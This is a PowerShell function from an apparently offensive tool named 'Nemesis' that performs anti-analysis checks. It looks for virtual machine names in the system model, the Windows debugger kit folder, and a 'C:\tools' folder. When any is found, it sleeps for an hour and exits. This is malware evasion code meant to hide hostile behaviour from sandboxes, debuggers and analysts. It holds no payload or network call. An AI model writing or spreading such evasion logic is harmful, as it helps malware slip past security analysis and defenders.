# ============================================================
# NEMESIS — OPS GUARD (Anti-Analysis, Anti-VM, Anti-Debug)
# ============================================================

function Invoke-OpsGuard {
    Write-Host "🟢 Nemesis: Running OPSEC guard..." -ForegroundColor Cyan

    # Anti-VM check
    $vmIndicators = @("vbox", "vmware", "qemu", "hyper-v", "docker")
    $systemInfo = (Get-WmiObject Win32_ComputerSystem).Model
    foreach ($indicator in $vmIndicators) {
        if ($systemInfo -match $indicator) {
            Write-Host "🟢 Nemesis: VM detected. Sleeping..." -ForegroundColor Yellow
            Start-Sleep -Seconds 3600
            exit
        }
    }

    # Anti-Debug check
    if (Test-Path "C:\Program Files (x86)\Windows Kits\10\Debuggers") {
        Write-Host "🟢 Nemesis: Debugger detected. Exiting." -ForegroundColor Red
        exit
    }

    # Sandbox detection
    if (Test-Path "C:\tools") {
        Write-Host "🟢 Nemesis: Sandbox detected. Sleeping..." -ForegroundColor Yellow
        Start-Sleep -Seconds 3600
        exit
    }

    Write-Host "🟢 Nemesis: OPSEC guard passed." -ForegroundColor Green
}
